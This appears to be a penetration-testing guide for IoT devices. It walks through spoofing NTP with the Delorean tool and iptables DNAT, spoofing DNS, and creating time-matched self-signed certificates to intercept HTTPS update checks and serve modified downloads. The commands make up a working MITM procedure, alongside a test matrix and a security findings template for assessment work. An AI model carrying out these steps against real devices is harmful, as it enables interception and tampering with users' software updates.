# NTP + Certificate Time Attack Guide

## Overview

This attack uses NTP spoofing to manipulate the device's clock, then exploits certificate time validation to MITM connections. Some IoT devices may be vulnerable if they rely on NTP for time without proper validation.

## Attack Theory

SSL certificates have validity periods (Not Before / Not After). By manipulating the device clock:
1. We can make our self-signed cert appear valid (create cert valid for spoofed time)
2. We can make expired certs appear valid again
3. We can make future-dated certs appear valid
4. We can potentially cause cert validation to fail in exploitable ways

## NTP Server IPs

Many IoT devices use hardcoded NTP server IP addresses, not DNS hostnames. Common providers:

| Provider | IP Addresses |
|----------|--------------|
| Cloudflare | `162.159.200.1`, `162.159.200.123` |
| Google | `216.239.35.0`, `216.239.35.4`, `216.239.35.8`, `216.239.35.12` |

DNS spoofing alone won't redirect NTP traffic if the device uses hardcoded IPs. The `delorean.sh` script handles this automatically using iptables DNAT rules to intercept traffic to these IPs.

## Attack Flow

```
Device                                              MITM Router
   |                                                    |
   |-- NTP to 162.159.200.1 (hardcoded IP) ------------>|
   |                     [iptables DNAT intercepts]     |
   |<-- Fake NTP response (clock = 2030) ---------------|
   |                                                    |
   |   [Device clock now year 2030]                     |
   |                                                    |
   |-- DNS: api.example.com --------------------------->|
   |<-- 192.168.200.1 (spoofed) ------------------------|
   |                                                    |
   |-- HTTPS api.example.com:443 ---------------------->|
   |<-- Cert valid 2029-2031 (appears valid!) ----------|
   |                                                    |
   |-- GET /releases ---------------------------------->|
   |<-- {"url":"https://update.example.com/..."} -------|
   |                                                    |
   |-- DNS: update.example.com ------------------------>|
   |<-- 192.168.200.1 (spoofed) ------------------------|
   |                                                    |
   |-- HTTPS update.example.com:443 ------------------>|
   |<-- Same cert (valid for both domains) -------------|
   |                                                    |
   |-- GET /file ------------------------------------->|
   |<-- Modified content ------------------------------|
```

## Prerequisites

- Delorean installed at `./delorean/`
- MITM router setup working
- Target domains in dns-spoof.conf (intercepted)
- Certificate valid for BOTH hostnames

---

## Phase 1: Generate Time-Matched Certificates

### Install faketime

```bash
# Arch Linux
sudo pacman -S libfaketime

# Debian/Ubuntu
sudo apt install faketime
```

### Create certs directory

```bash
mkdir -p certs
```

### Generate cert valid 2029-2032 (for +1500 days attack)

This cert will be valid when device clock is manipulated to ~2030.
**Important:** Certificate must include BOTH hostnames since we spoof both domains.

```bash
faketime '2029-01-01' openssl req -x509 -newkey rsa:4096 \
  -keyout certs/future-2030.key \
  -out certs/future-2030.crt \
  -sha256 -days 1095 \
  -nodes \
  -subj "/CN=api.example.com" \
  -addext "subjectAltName=DNS:api.example.com,DNS:update.example.com"
```

### Generate cert valid 2015-2018 (for -3650 days attack)

This cert will be valid when device clock is manipulated to ~2016.

```bash
faketime '2015-01-01' openssl req -x509 -newkey rsa:4096 \
  -keyout certs/past-2016.key \
  -out certs/past-2016.crt \
  -sha256 -days 1095 \
  -nodes \
  -subj "/CN=api.example.com" \
  -addext "subjectAltName=DNS:api.example.com,DNS:update.example.com"
```

### Verify certificate dates

```bash
openssl x509 -in certs/future-2030.crt -noout -dates
# Should show:
# notBefore=Jan  1 00:00:00 2029 GMT
# notAfter=Dec 31 23:59:59 2031 GMT

openssl x509 -in certs/past-2016.crt -noout -dates
# Should show dates around 2015-2018
```

---

## Phase 2: Configure DNS Spoofing

### Edit dns-spoof.conf

Spoof BOTH api and update domains:

```bash
# NTP + Certificate Time Attack: Intercept BOTH domains
# With time manipulation, our self-signed cert appears valid for both
address=/api.example.com/192.168.200.1
address=/update.example.com/192.168.200.1

# NOTE: NTP DNS spoofing is NOT needed if device uses hardcoded IPs
# delorean.sh handles NTP interception via iptables DNAT
```

**Important:** Both domains must be spoofed for the fake server to handle both API and download requests.

---

## Phase 3: Test Procedure

### Step 1: Start MITM Router (no proxy mode)

```bash
sudo ./mitm.sh up -m none
```

### Step 2: Start Delorean NTP Spoofer

For future time attack (+1500 days puts clock at ~2029-2030):

```bash
sudo ./delorean.sh start +1500
```

For past time attack (-3650 days puts clock at ~2015):

```bash
sudo ./delorean.sh start -3650
```

**Note:** `delorean.sh` automatically adds iptables DNAT rules to intercept:
- All UDP port 123 traffic on br0
- Traffic to hardcoded Cloudflare IPs: 162.159.200.1, 162.159.200.123
- Traffic to hardcoded Google IPs: 216.239.35.0, 216.239.35.4, 216.239.35.8, 216.239.35.12

### Step 3: Start HTTPS Server with Time-Matched Certificate

For future cert:

```bash
# Start your HTTPS server with the time-matched certificate
python3 -m http.server --ssl-cert certs/future-2030.crt --ssl-key certs/future-2030.key 443
```

For past cert:

```bash
python3 -m http.server --ssl-cert certs/past-2016.crt --ssl-key certs/past-2016.key 443
```

### Step 4: Monitor NTP Traffic

```bash
sudo tcpdump -i br0 -n udp port 123
```

### Step 5: Monitor Delorean

```bash
tail -f tmp_delorean.log
```

### Step 6: Trigger Device NTP Sync

Options to trigger NTP sync on device:
1. Reboot the device
2. Wait for periodic NTP sync
3. Force sync via device settings (if available)

### Step 7: Trigger Update

Once device clock is manipulated, trigger an update check from the device.

---

## Test Matrix

| Test | NTP Offset | Approx Date | Cert Valid | Expected Result |
|------|------------|-------------|------------|-----------------|
| 1 | +1000 days | ~2028 | 2029-2031 | Cert "not yet valid" - reject |
| 2 | +1500 days | ~2030 | 2029-2031 | Cert VALID - may accept |
| 3 | +2000 days | ~2031 | 2029-2031 | Cert expired - reject |
| 4 | -3650 days | ~2015 | 2015-2018 | Cert VALID - may accept |
| 5 | Current | Today | 2029-2031 | Cert "not yet valid" (baseline) |

### Quick Reference: Time Offset Calculator

| Offset | Target Year | Use Cert |
|--------|-------------|----------|
| +1500 | ~2029 | future-2030 |
| +1825 | ~2030 | future-2030 |
| +2190 | ~2031 | future-2030 |
| -3650 | ~2015 | past-2016 |
| -2920 | ~2017 | past-2016 |

---

## Expected Results

### Vulnerable Device

If the device is vulnerable:
- Delorean log shows NTP response sent
- Device accepts the manipulated time
- Device accepts our self-signed certificate (time matches validity period)
- Server logs show download requests
- Device downloads content

```
[delorean.log]
Received NTP request from 192.168.200.x
Sent fake response: 2030-01-15 12:00:00

[server.log]
GET /file - 200 OK
```

### Secure Device

If the device is secure:
- Device uses authenticated NTP (NTS) - Delorean response rejected
- Device ignores large time jumps
- Device validates certificate CA chain (rejects self-signed)
- Device uses certificate pinning
- No download requests in server logs

---

## Troubleshooting

### No NTP traffic seen

1. Check device is connected to MITM network
2. Verify iptables rules are active: `./delorean.sh status`
3. Verify iptables DNAT rules: `sudo iptables -t nat -L -n | grep 123`
4. Check Delorean is listening: `sudo ss -uln | grep 123`

### Device clock doesn't change

1. Device may require authenticated NTP (NTS)
2. Device may have sanity checks rejecting large time jumps
3. Device may sync time from HTTPS response headers

### Certificate still rejected

1. Verify cert dates match spoofed time: `openssl x509 -in cert.crt -noout -dates`
2. Device may validate CA chain (not just time)
3. Device may use certificate pinning

---

## Cleanup

```bash
# Stop server (Ctrl+C)

# Stop Delorean (automatically removes iptables rules)
sudo ./delorean.sh stop

# Stop MITM router
sudo ./mitm.sh down
```

---

## Security Findings Template

### NTP Time Manipulation

| Test | Result |
|------|--------|
| Device uses NTP | YES / NO |
| NTP server IPs | Hardcoded / DNS-based |
| Accepts unauthenticated NTP | YES / NO |
| Accepts large time jumps | YES / NO |

### Certificate Validation with Manipulated Time

| Test | NTP Offset | Cert | Result |
|------|------------|------|--------|
| Future time | +1500 | future-2030 | ACCEPTED / REJECTED |
| Past time | -3650 | past-2016 | ACCEPTED / REJECTED |

### Vulnerability Assessment

- [ ] Device accepts unauthenticated NTP responses
- [ ] Device accepts arbitrary time changes
- [ ] Device accepts self-signed certs when time matches validity
- [ ] Content can be served via MITM

---

## Related Documentation

- `delorean.sh` - Wrapper script for Delorean NTP tool
- `cert-hostname-substring-test.md` - Certificate hostname validation test
- `sslstrip-mode.md` - TLS downgrade testing
- `intercept-mode.md` - HTTP/HTTPS interception
- [Delorean GitHub](https://github.com/jselvi/Delorean)
